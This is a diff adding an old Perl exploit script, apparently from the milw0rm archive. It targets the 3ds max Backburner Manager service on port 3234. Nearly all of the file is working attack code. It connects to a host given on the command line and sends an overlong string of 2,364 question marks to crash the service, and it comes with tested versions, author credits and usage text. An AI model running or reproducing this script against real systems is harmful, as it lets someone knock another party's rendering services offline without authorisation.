@@ -1,0 +1,56 @@
+#3Dmax backburner Manager Dos Exploit
+#There are security hole in 3Dmax backburner Manager Default listen port is 3234.
+#It's can be Dos by long string
+
+#Tested on Version
+#3dmax 5.0 backburner Manager Version 2.0
+#3dmax 6.0 backburner Manager Version 2.2
+#3dmax 6.0 SP1 backburner Manager Version 2.2
+#All Windows OS
+
+#Found By Xtiger -->www.Xtiger.net&www.ThySea.com
+#Code by Xtiger coolsumer@163.com
+#Reference:  http://jishu.thysea.com/index.php?modules=show&id=10327
+----------------------------------------------------------------
+#!C:\perl\bin\perl.exe
+
+use IO::Socket;
+
+my $progname = $0;
+$progname =~ s,.'*/,,;
+$progname =~ s/\.\w*$//;
+
+$host = shift || 'localhost';
+$port = shift || '3234';
+$title = " =============================================\n&#8214; 3Dmax backburner Manager Dos Exploit 1.0! &#8214;\n =============================================\n  BY tiger---www.Xtiger.net&www.ThySea.com\n";
+$Usage = "  Usage: $progname [Host] [port](default is 3234)\n";
+
+if ($host > 0){
+   dos();
+}
+else  {
+   usage();
+}
+
+sub dos
+{
+my $socket = IO::Socket::INET->new ( Proto => "tcp",
+PeerAddr => $host,
+PeerPort => $port,
+)
+or print "$title  [*] ERR-->can't connect to $host:$port! :(\n" and exit;
+print ($title, "[*] connected to $host:$port\n");
+print "[*] Sending string...\n";
+
+print $socket ("?"x(2364),"\r\n") or die "$title  [*] ERR-->Sending string failed! :(\n";
+print "[*] maybe crashed!\n";
+
+$socket->close;
+}
+
+sub usage
+{
+   die $title,$Usage;
+}
+
+# milw0rm.com [2004-11-28]
